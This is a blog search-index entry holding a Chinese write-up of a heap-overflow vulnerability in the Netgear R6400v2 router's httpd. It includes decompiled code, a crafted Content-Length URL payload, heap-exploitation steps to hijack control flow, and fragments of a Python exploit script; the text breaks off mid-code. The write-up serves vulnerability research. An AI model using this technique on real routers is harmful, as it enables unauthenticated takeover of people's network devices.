<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Netgear R6400v2 堆溢出漏洞分析与利用</title>
      <link href="2021/03/19/Netgear-R6400v2-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>2021/03/19/Netgear-R6400v2-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>2020年6月，<code>ZDI</code>发布了一个关于<code>Netgear R6700</code>型号设备上堆溢出漏洞的<span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwOS8=">安全公告<i class="fa fa-external-link-alt"></i></span>，随后又发布了一篇关于该漏洞的<span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Jsb2cvMjAyMC82LzI0L3pkaS0yMC03MDktaGVhcC1vdmVyZmxvdy1pbi10aGUtbmV0Z2Vhci1uaWdodGhhd2stcjY3MDAtcm91dGVy">博客<i class="fa fa-external-link-alt"></i></span>，其中对该漏洞进行了详细分析，并给出了完整的漏洞利用代码。该漏洞存在于对应设备的<code>httpd</code>组件中，在处理配置文件上传请求时，由于对请求内容的处理不当，在后续申请内存空间时存在整数溢出问题，从而造成堆溢出问题。攻击者利用这一漏洞可以在目标设备上实现代码执行，且无需认证。</p><a id="more"></a><p>此前，关于<code>IoT</code>设备上公开的带完整漏洞利用的堆溢出漏洞比较少(好像公开的堆溢出漏洞就不多…)，正好手边有一个<code>R6400v2</code>型号的设备，因此打算分析一下该漏洞，了解漏洞利用的思路，并尝试基于<code>R6400v2</code>型号设备实现漏洞利用。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据<code>Netgear</code>官方的<span class="exturl" data-url="aHR0cHM6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwNjE5ODIvU2VjdXJpdHktQWR2aXNvcnktZm9yLU11bHRpcGxlLVZ1bG5lcmFiaWxpdGllcy1vbi1Tb21lLVJvdXRlcnMtTW9iaWxlLVJvdXRlcnMtTW9kZW1zLUdhdGV3YXlzLWFuZC1FeHRlbmRlcnM=">安全公告<i class="fa fa-external-link-alt"></i></span>，针对<code>R6400v2</code>型号设备，版本<code>v1.0.4.84</code>及其之前版本受该漏洞影响，在之后的版本中修复了该漏洞，因此选择<code>v1.0.4.84</code>版本来对该漏洞进行分析。</p><p><code>ZDI</code>的<span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Jsb2cvMjAyMC82LzI0L3pkaS0yMC03MDktaGVhcC1vdmVyZmxvdy1pbi10aGUtbmV0Z2Vhci1uaWdodGhhd2stcjY3MDAtcm91dGVy">博客<i class="fa fa-external-link-alt"></i></span>中已经对该漏洞进行了分析，故这里简单说明下。该漏洞存在于<code>httpd</code>组件的<code>http_d()</code>函数中，在处理配置文件上传请求时(接口为<code>&quot;/backup.cgi&quot;</code>)，在<code>(1)</code>处会调用<code>recv()</code>读取数据，第一次读取完数据后，程序流程会到达<code>(2)</code>处，对请求头中的部分字段进行判断。之后会再次调用<code>recv()</code>读取数据，之后程序流程会到达<code>(3)</code>处。之后在<code>(4)</code>处计算请求头中<code>&quot;Content-Length&quot;</code>字段对应的值，基于该值，在<code>(5)</code>处计算实际的文件内容长度。在<code>(6)</code>处会根据计算得到的文件内容大小申请内存空间，在<code>(7)</code>处调用<code>memcpy()</code>进行拷贝。</p><p>存在该漏洞的原因在于，在计算请求头中<code>&quot;Content-Length&quot;</code>字段对应的值时，通过调用<code>stristr(s1, &quot;Content-Length: &quot;)</code>来定位其位置，当在请求<code>url</code>中包含<code>&quot;Content-Length: &quot;</code>时，可使得计算的值错误，从而影响后续申请的堆块大小。通过伪造合适的<code>&quot;Content-Length: xxx&quot;</code>，可造成后续在调用<code>memcpy()</code>时出现堆溢出。该漏洞的发现者<code>d4rkn3ss</code>给出的请求<code>url</code>为<code>&quot;/cgi-bin/genie.cgi?backup.cgiContent-Length: 4156559&quot;</code>。</p><blockquote><p>同样，由于在<code>R6400v2</code>设备上存在<code>nginx</code>代理，<code>nginx</code>会保证请求头中的<code>Content-Length</code>对应的值与请求体的内容长度相等，故无法通过直接伪造原始请求头中的<code>Content-Length</code>触发。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">http_d</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( v248.s_addr ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> ) &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> ) &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// ...</span></span><br><span class="line">              <span class="keyword">if</span> ( (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v223[<span class="number">0</span>].__fds_bits[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_F253F4 &gt;&gt; <span class="number">5</span>] &gt;&gt; (dword_F253F4 &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span>) != <span class="number">0</span></span><br><span class="line">                || (v92 = dword_1994EC) != <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                var_recv_len = my_read(dword_F253F4, &amp;recv_buf, <span class="number">0x400</span>u); <span class="comment">// (1) recv(), 请求过长的话会被调用多次</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">              &#125;</span><br><span class="line">              v152 = v198;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_395;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( var_recv_len == <span class="number">-2</span> );</span><br><span class="line">            <span class="keyword">if</span> ( v150 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v144 = var_recv_len + var_offset;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">int</span>)(var_recv_len + var_offset) &gt;= <span class="number">0x10000</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span>(&amp;s1[var_offset], &amp;recv_buf, var_recv_len);     <span class="comment">// (2)</span></span><br><span class="line">              s1[v144] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( stristr(s1, <span class="string">&quot;Content-Disposition:&quot;</span>) &amp;&amp; stristr(s1, <span class="string">&quot;Content-Length: &quot;</span>) &amp;&amp; stristr(s1, <span class="string">&quot;upgrade_check.cgi&quot;</span>)</span><br><span class="line">                &amp;&amp; (stristr(s1, <span class="string">&quot;Content-Type: application/octet-stream&quot;</span>) || stristr(s1, <span class="string">&quot;MSIE 10&quot;</span>))</span><br><span class="line">                || stristr(s1, <span class="string">&quot;Content-Disposition:&quot;</span>) &amp;&amp; stristr(s1, <span class="string">&quot;Content-Length: &quot;</span>) &amp;&amp; stristr(s1, <span class="string">&quot;backup.cgi&quot;</span>)</span><br><span class="line">                || stristr(s1, <span class="string">&quot;Content-Disposition:&quot;</span>) &amp;&amp; stristr(s1, <span class="string">&quot;Content-Length: &quot;</span>)&amp;&amp; stristr(s1, <span class="string">&quot;genierestore.cgi&quot;</span>) )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                <span class="keyword">goto</span> LABEL_356;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// ...</span></span><br><span class="line">LABEL_356:</span><br><span class="line">                v150 = <span class="number">1</span>; <span class="keyword">goto</span> LABEL_357;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        v107 = stristr(s1, <span class="string">&quot;name=\&quot;mtenRestoreCfg\&quot;&quot;</span>);      <span class="comment">// (3)</span></span><br><span class="line">        <span class="keyword">if</span> ( v107 &amp;&amp; (v108 = stristr(v107, <span class="string">&quot;\r\n\r\n&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v109 = v108 + <span class="number">4</span>;                      <span class="comment">// 指向文件内容</span></span><br><span class="line">          v102 = v108 + <span class="number">4</span> - (_DWORD)s1;         <span class="comment">// post请求部分除文件内容之外其他部分的长度</span></span><br><span class="line">          v110 = stristr(s1, <span class="string">&quot;Content-Length: &quot;</span>);<span class="comment">// 没有考虑其位置,可以在url中伪造,进而造成后续出现堆溢出</span></span><br><span class="line">          <span class="keyword">if</span> ( !v110 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_286;</span><br><span class="line">          v111 = v110 + <span class="number">15</span>;</span><br><span class="line">          v112 = stristr(v110 + <span class="number">16</span>, <span class="string">&quot;\r\n&quot;</span>) - (v110 + <span class="number">16</span>);</span><br><span class="line">          v105 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v112; ++i )          <span class="comment">// (4) Content-Length对应的值</span></span><br><span class="line">          &#123;</span><br><span class="line">            v114 = *(<span class="keyword">char</span> *)++v111;</span><br><span class="line">            v105 = v114 - <span class="string">&#x27;0&#x27;</span> + <span class="number">10</span> * v105;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v105 &gt; <span class="number">0x20017</span> )                 <span class="comment">// post data部分的长度</span></span><br><span class="line">          &#123;</span><br><span class="line">            v105 = stristr(s1, <span class="string">&quot;\r\n\r\n&quot;</span>) + v105 + <span class="number">4</span> - v109;<span class="comment">// (5) 计算文件内容的长度, 由于v105是伪造的, 故计算得到的结果会有问题</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_287;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">LABEL_287:</span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">          <span class="keyword">if</span> ( dword_1A870C )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">free</span>((<span class="keyword">void</span> *)dword_1A870C);</span><br><span class="line">            dword_1A870C = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          sub_2F284((<span class="keyword">int</span> *)&amp;v224);</span><br><span class="line">          dword_1A870C = (<span class="keyword">int</span>)<span class="built_in">malloc</span>(v105 + <span class="number">0x258</span>);     <span class="comment">// (6)</span></span><br><span class="line">          <span class="keyword">if</span> ( dword_1A870C || ...)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">memset</span>((<span class="keyword">void</span> *)dword_1A870C, <span class="number">0x20</span>, v105 + <span class="number">0x258</span>);</span><br><span class="line">            v203=var_offset-v102; <span class="comment">// 对于超长请求, var_offset最大值位0x800(只会触发recv() 2次)</span></span><br><span class="line">            <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)dword_1A870C, &amp;s1[v102], var_offset-v102);<span class="comment">// (7) heap overflow</span></span><br><span class="line">            <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="原始方法"><a href="#原始方法" class="headerlink" title="原始方法"></a>原始方法</h4><p><code>ZDI</code>的<span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Jsb2cvMjAyMC82LzI0L3pkaS0yMC03MDktaGVhcC1vdmVyZmxvdy1pbi10aGUtbmV0Z2Vhci1uaWdodGhhd2stcjY3MDAtcm91dGVy">博客<i class="fa fa-external-link-alt"></i></span>中也给出了漏洞的上下文以及利用思路，这里进行简单概括。关于该漏洞的上下文如下：</p><ul><li><p>可以往堆上写任意的数据，包括<code>&#39;\x00&#39;</code></p></li><li><p><code>ASLR</code> 等级为1，因此堆空间的起始地址是固定的</p></li><li><p>该设备使用的是<code>uClibc</code>，相当于一个简化版的<code>glibc</code>，其关于堆的检查条件比<code>glibc</code>中宽松很多</p></li><li><p>在实现堆溢出之后，<code>fopen()</code>函数会被调用，其中会分别调用<code>malloc(0x60)</code>和<code>malloc(0x1000)</code>，之后也会调用free()进行释放。堆块的申请与释放先后顺序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(dword_1A870C) -&gt; dword_1A870C = <span class="built_in">malloc</span>(&lt;controllable_size&gt;) -&gt; <span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x60</span>)) -&gt; <span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x1000</span>))</span><br></pre></td></tr></table></figure></li><li><p>通过请求接口<code>&quot;/strtblupgrade.cgi&quot;</code>，可以实现任意大小的堆块申请与释放：<code>free(malloc(&lt;controllable_size&gt;))</code></p></li></ul><p><code>d4rkn3ss</code>利用<code>fastbin dup attack</code>的思路来进行漏洞利用，即通过破坏堆的状态，使得后续的<code>malloc()</code>返回指定的地址，由于可以往该地址写任意内容(<code>write-what-where</code>)，故可以通过覆盖<code>got</code>表项的方式实现任意代码执行。但是前面提到，在实现堆溢出之后，在<code>fopen()</code>内会调用<code>malloc(0x1000)</code>，其会触发<code>__malloc_consolidate()</code>，从而破坏已有的<code>fastbin</code>，因此需要先解决<code>__malloc_consolidate()</code>的问题。</p><p>在<code>uClibc</code>中的<code>free()</code>函数内，在释放<code>fastbin</code>时存在越界写问题，而在<code>malloc_state</code>结构体中，<code>max_fast</code>变量正好在<code>fastbins</code>数组前，通过越界写可以实现修改<code>max_fast</code>变量的目的。当<code>max_fast</code>变量被改成一个很大的值后，后续再调用<code>malloc(0x1000)</code>时便不会触发<code>__malloc_consolidate()</code>，从而可以执行<code>fastbin dup attack</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span>* mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">       and used quickly in malloc.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">    <span class="comment">/* If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">       bordering top into fastbins */</span></span><br><span class="line">    &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       ) &#123;</span><br><span class="line"></span><br><span class="line">set_fastchunks(av);</span><br><span class="line">fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);<span class="comment">// out-of-bounds write</span></span><br><span class="line">p-&gt;fd = *fb;</span><br><span class="line">*fb = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The maximum chunk size to be eligible for fastbin */</span></span><br><span class="line">  <span class="keyword">size_t</span>  max_fast;   <span class="comment">/* low 2 bits used as flags */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr        top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr        last_remainder;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>综上，漏洞利用的过程如下：</p><ul><li><p>通过堆溢出修改下一个空闲块的<code>prev_size</code>字段和<code>size</code>字段，填充合适的<code>prev_size</code>值，并使得<code>PREV_INUSE</code>标志位为0；</p><blockquote><p>之后在触发<code>__malloc_consolidate()</code>时，会对该<code>fastbin</code>进行后向合并，因此需要保证能根据伪造的<code>prev_size</code>找到前面的某个空闲块，否则<code>unlink</code>时会报错</p></blockquote></li><li><p>通过<code>/strtblupgrade.cgi</code>接口申请一个合适大小的堆块，该堆块会与上面已分配的堆块重叠，从而可以修改上面堆块的大小为<code>0x8</code>；</p><blockquote><p>在上一步<code>__malloc_consolidate()</code>后，由于堆块的后向合并，故会存在一个空闲的堆块与已分配的堆块重叠</p></blockquote></li><li><p>释放上面已分配的堆块，在将其放入<code>fastbins</code>数组中时，会出现越界写，从而将<code>max_fast</code>修改为一个很大的值；</p><blockquote><p>max_fast被修改为一个很大的值后，调用<code>mallco(0x1000)</code>时就不会触发<code>__malloc_consolidate()</code>，之后就可以执行<code>fastbin dup attack</code></p></blockquote></li><li><p>再次通过堆溢出覆盖下一个空闲块，修改其<code>fd</code>指针为<code>free()</code>的<code>got</code>地址(准确来说为<code>free_got_addr - offset</code>)；</p></li><li><p>连续申请2个合适的堆块，返回的第2个堆块的地址指向<code>free()</code>的got表项，通过向堆块中写入数据，将其修改为<code>system()</code>的<code>plt</code>地址；</p></li><li><p>当释放第2个堆块时，执行<code>free()</code>将调用<code>system()</code>，同时其参数指向构造的<code>payload</code>，从而实现代码执行。</p></li></ul><blockquote><p><code>H4lo</code>师傅提供了另外的思路来进行漏洞利用，具体可参考<span class="exturl" data-url="aHR0cHM6Ly9lM3BlbS5naXRodWIuaW8vMjAxOS8wOC8yNi8wY3RmLTIwMTkvZW1iZWRkZWRfaGVhcC8=">这里<i class="fa fa-external-link-alt"></i></span></p></blockquote><h4 id="“意外”方法"><a href="#“意外”方法" class="headerlink" title="“意外”方法"></a>“意外”方法</h4><p>基于上述思路，在<code>R6400v2</code>设备上进行漏洞利用时发现存在如下问题：</p><ul><li>通过<code>malloc(0x30) -&gt; malloc(0x40) -&gt; malloc(0x30)</code>方式进行堆布局时，得到的两个堆块之间的偏移比较小，但是由于返回的堆地址比较小，在后续触发<code>__malloc_consolidate()</code>对空闲堆块进行后向合并时，往前找不到合适的空闲堆块，无法进行堆块合并。尝试通过分配不同的堆块大小、以及发送不同的请求等方式，均无法得到满足条件的堆块。</li><li>通过<code>malloc(0x20) -&gt; malloc(0x10) -&gt; malloc(0x20)</code>方式进行堆布局时，得到的两个堆块之间的偏移比较大(<code>超过0x470</code>)，按照<code>d4rkn3ss</code>提供的漏洞利用代码，好像无法实现溢出来覆盖下一个堆块。</li></ul><p>由于多次尝试第一种方式均失败，只能寄希望于第二种方式。由于触发漏洞的接口为<code>&quot;/backup.cgi&quot;</code>(配置文件上传接口)，按理来说上传的配置文件可以比较大，故该接口应该可以处理较长的请求，但当文件内容长度超过<code>0x400</code>时却无法溢出。通过对该请求的处理流程进行分析发现，要通过该接口触发漏洞，整个请求的长度要在<code>0x400~0x800</code>之间，如下：</p><ul><li>该请求必须触发2次<code>recv()</code> ，即对应请求长度必须&gt;<code>0x400</code>，否则无法到达漏洞点处；</li><li>该请求只会触发2次<code>recv()</code>，当对应请求长度&gt;<code>0x800</code>，过长的内容会被截断，后续拷贝时无法造成溢出。</li></ul><p>在<code>d4rkn3ss</code>提供的漏洞利用脚本中，可以看到在请求头中有一个<code>&#39;a&#39;*0x200</code>的占位符，同时<code>make_filename()</code>也有一个类似的占位符，因此实际可上传的配置文件大小约为<code>0x2c0</code>左右，故当两个堆块之间的偏移超过<code>0x400</code>时无法造成堆溢出。解决方式很简单，当要上传大文件时，去掉占位符<code>&#39;a&#39;*0x200</code>即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_filename</span>(<span class="params">chunk_size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x1d7</span> - chunk_size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">    path = <span class="string">&#x27;/cgi-bin/genie.cgi?backup.cgiContent-Length: 4156559&#x27;</span></span><br><span class="line">    headers = [<span class="string">&#x27;Host: %s:%s&#x27;</span> % (rhost, rport), <span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span> + <span class="string">&#x27;: d4rkn3ss&#x27;</span>]</span><br></pre></td></tr></table></figure><p>在解决了该问题后，打算按照原来的思路进行利用，可能存在的一些问题如下：</p><ul><li>两个堆块之间的偏移约为<code>0x470</code>，而且不相邻，在溢出覆盖目标空闲堆块时是否会破坏其他结构?</li><li>溢出到目标空闲堆块后，在触发<code>__malloc_consolidate()</code>对该空闲堆块进行后向合并时，后向偏移约为<code>0x24e0</code>，通过<code>/strtblupgrade.cgi</code>接口申请合适大小的堆块，利用该堆块修改上面已分配堆块的<code>size</code>字段，是否会破坏其他结构？</li></ul><p>经过测试，发现和预期不太一致：通过<code>/strtblupgrade.cgi</code>接口申请的堆地址在前面合并的空闲堆块地址之前，同时，此时的<code>$PC</code>已经被填充的<code>payload</code>控制了，直接实现了劫持控制流的目的。如下，可以看到<code>$PC</code>的值来自于填充的内容，同时部分寄存器如<code>$R4</code>也指向填充的<code>payload</code>。因此，只需要找到合适的<code>rop gadgets</code>，构造合适的<code>payload</code>，即可实现代码执行。</p><img data-src="images/httpd_pc_control_crash.png" style="zoom:80%"><p>根据<code>backtrace</code>信息，查看<code>uClibc</code>中函数<code>__stdio_WRITE()</code>的源码，如下。在<code>__stdio_WRITE()</code>中，正常情况下是通过宏<code>_WRITE</code>来调用<code>__gcs.write()</code>函数，但经过上述操作后，<code>STREAMPTR</code>指向了填充的<code>payload</code>，从而可以控制<code>(STREAMPTR)-&gt;__gcs.write</code>。经过调试暂时未定位到修改<code>STREAMPTR</code>的地方(在下断点进一步分析时，有时貌似无法复现… 暂时未想到其他方式来定位)，感兴趣的可以试试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in _WRITE.c</span></span><br><span class="line"><span class="keyword">size_t</span> attribute_hidden __stdio_WRITE(<span class="keyword">register</span> FILE *stream,</span><br><span class="line"> <span class="keyword">register</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> bufsize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> todo;</span><br><span class="line"><span class="keyword">ssize_t</span> rv, stodo;</span><br><span class="line"></span><br><span class="line">__STDIO_STREAM_VALIDATE(stream);</span><br><span class="line">assert(stream-&gt;__filedes &gt;= <span class="number">-1</span>);</span><br><span class="line">assert(__STDIO_STREAM_IS_WRITING(stream));</span><br><span class="line">assert(!__STDIO_STREAM_BUFFER_WUSED(stream)); <span class="comment">/* Buffer must be empty. */</span></span><br><span class="line"></span><br><span class="line">todo = bufsize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (todo != <span class="number">0</span>) &#123;</span><br><span class="line">stodo = (todo &lt;= SSIZE_MAX) ? todo : SSIZE_MAX;</span><br><span class="line">rv = __WRITE(stream, (<span class="keyword">char</span> *) buf, stodo);<span class="comment">// &lt;===</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// _stdio.h </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __WRITE(STREAMPTR,BUF,SIZE) \</span></span><br><span class="line">((((STREAMPTR)-&gt;__gcs.write) == <span class="literal">NULL</span>) ? <span class="number">-1</span> : \</span><br><span class="line">(((STREAMPTR)-&gt;__gcs.write)((STREAMPTR)-&gt;__cookie,(BUF),(SIZE))))</span><br></pre></td></tr></table></figure><p>综上，上述思路的主要过程如下。需要说明的是，在未访问设备<code>Web</code>后台(比如重启设备后)和访问<code>Web</code>后台后，调用<code>malloc(0x8)</code>返回的堆块地址不太一致(存在0x10的偏移)，使得下列过程不太稳定(不适用于访问过<code>Web</code>后台的情形)，建议重启设备后测试。本来想通过触发<code>__malloc_consolidate()</code>来使得堆块状态一致，但好像不起作用…</p><blockquote><p><code>colorlight</code>师傅建议通过先多次发送登录请求(错误的认证即可)，当响应的状态码为<code>200</code>时，可使得两种情形下的堆状态一致，但测试后发现针对上述情形似乎仍然无效 …</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 